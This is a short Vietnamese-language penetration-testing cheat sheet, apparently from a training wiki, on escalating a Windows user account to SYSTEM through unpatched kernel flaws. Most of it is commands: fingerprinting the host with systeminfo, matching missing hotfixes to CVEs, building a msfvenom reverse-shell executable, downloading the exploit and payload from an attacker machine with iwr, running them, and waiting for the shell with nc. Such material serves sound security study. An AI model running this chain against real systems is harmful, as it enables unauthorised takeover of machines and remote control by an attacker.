# Kernel Exploit

## Điểm chính khai thác

* Khai thác các lỗ hổng trong kernel Windows (như lỗi quản lý bộ nhớ, xử lý token, hoặc driver) để leo thang đặc quyền từ tài khoản người dùng thông thường lên **NT AUTHORITY\SYSTEM.**
* Lệnh `systeminfo` giúp thu thập thông tin về phiên bản OS, kiến trúc, và hotfix để xác định các lỗ hổng kernel chưa được vá.
* Các công cụ như **Windows-Exploit-Suggester**, **Sherlock**, hoặc **Exploit-DB** hỗ trợ xác định phiên bản OS và hotfix với các CVE kernel phù hợp.

## Các bước khai thác

### Kiểm tra lỗ hổng

#### Xác định mục tiêu tiềm năng

Thu thập thông tin hệ thống để xác định phiên bản OS, kiến trúc, và hotfix đã cài đặt:

{% code overflow="wrap" %}

```
systeminfo | findstr /B /C:"Host Name" /C:"OS Name" /C:"OS Version" /C:"System Type" /C:"Hotfix(s)"
```

{% endcode %}

#### Phân tích ngữ cảnh thực thi

So sánh thông tin `systeminfo` với cơ sở dữ liệu CVE để tìm kernel exploit phù hợp:

{% code overflow="wrap" %}

```
python windows-exploit-suggester.py --database 2025-05-16-mssb.xls --systeminfo systeminfo.txt
```

{% endcode %}

### Thực thi khai thác

#### Chuẩn bị payload hoặc mã khai thác

Tạo payload reverse shell để sử dụng với exploit:

{% code overflow="wrap" %}

```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<kali_ip> LPORT=443 -f exe -o shell.exe
```

{% endcode %}

Tải exploit binary và payload lên thư mục tạm trên mục tiêu:

```
iwr -Uri http://<kali_ip>/<kernel_exploit>.exe -OutFile C:\Temp\exploit.exe
iwr -Uri http://<kali_ip>/shell.exe -OutFile C:\Temp\shell.exe
```

#### Áp dụng khai thác

Thực thi kernel exploit để chạy payload với đặc quyền SYSTEM:

```
./exploit.exe shell.exe
```

Chờ kết nối reverse shell:

```
nc -lvnp 443
```